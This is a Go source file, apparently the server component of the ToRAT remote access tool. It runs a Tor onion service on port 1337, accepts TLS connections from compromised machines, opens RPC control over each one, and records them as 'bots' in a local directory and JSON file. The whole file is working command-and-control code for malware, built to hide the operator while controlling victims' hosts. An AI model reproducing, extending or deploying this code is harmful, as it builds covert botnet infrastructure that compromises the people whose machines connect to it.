package server

import (
	"context"
	"crypto/ed25519"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"log"
	"net"
	"net/rpc"
	"os"
	"path/filepath"

	"github.com/cretz/bine/tor"
	torEd25519 "github.com/cretz/bine/torutil/ed25519"
	"github.com/fatih/color"
)

var (
	activeClients []activeClient

	data struct {
		Clients map[string]*Client
	}
)

const dataFile = "/dist_ext/.data.json"

func loadData() {
	content, err := os.ReadFile(dataFile)
	if err != nil {
		return
	}

	if err := json.Unmarshal(content, &data); err != nil {
		log.Println("Couldn't unmarshal data json:", err)
	}
}

func saveData() {
	content, err := json.MarshalIndent(&data, "", "\t")
	if err != nil {
		log.Panicln("Couldn't marshal data to json:", err)
	}

	if err := os.WriteFile(dataFile, content, 0777); err != nil {
		log.Panicln("Couldn't write data to file:", err)
	}
}

// Start runs the server
func Start() error {
	cert, err := tls.LoadX509KeyPair("../../torat_client/cert.pem", "../../keygen/priv_key.pem")
	if err != nil {
		return fmt.Errorf("could not load cert: %v", err)
	}

	tlsConfig := tls.Config{Certificates: []tls.Certificate{cert}}

	t, err := tor.Start(context.Background(), nil)
	if err != nil {
		return err
	}

	content, err := os.ReadFile("../../keygen/hs_private")
	if err != nil {
		return err
	}

	key := ed25519.PrivateKey(content)

	service, err := t.Listen(context.Background(), &tor.ListenConf{
		RemotePorts: []int{1337},
		Key:         torEd25519.FromCryptoPrivateKey(key),
	})
	if err != nil {
		return err
	}
	log.Println("Onion service running:", service.ID+".onion")

	loadData()
	for {
		conn, err := service.Accept()
		if err != nil {
			log.Println("accepting failed:", err)
			continue
		}
		tlsconn := tls.Server(conn, &tlsConfig)
		go accept(tlsconn)
	}
}

func accept(conn net.Conn) {
	ac := activeClient{
		RPC: rpc.NewClient(conn),
	}

	if err := ac.getHostname(); err != nil {
		log.Println("Invalid Hostname:", err)
		return
	}

	if data.Clients == nil {
		data.Clients = make(map[string]*Client, 1)
	}

	ac.Data().Hostname = ac.Hostname
	ac.Data().Path = filepath.Join("/dist_ext/bots", ac.Hostname)

	if _, err := os.Stat(ac.Data().Path); err != nil {
		os.MkdirAll(ac.Data().Path, os.ModePerm)
	}
	if ac.Data().Name == "" {
		ac.Data().Name = ac.Data().Hostname
	}

	saveData()

	activeClients = append(activeClients, ac)
	fmt.Println(green("[Server] [+] New Client: "), blue(ac.Data().Name))
}

func listConn() []string {
	var clients []string
	for i, c := range activeClients {
		client := data.Clients[c.Hostname]
		clients = append(clients, fmt.Sprintf("%4d %s\t%s", i, client.Hostname, client.Name))
	}
	return clients
}

func printClients() {
	color.HiCyan("Clients:")
	list := listConn()
	for _, client := range list {
		color.Cyan(client)
	}
}

func getClient(target int) *activeClient {
	return &activeClients[target]
}
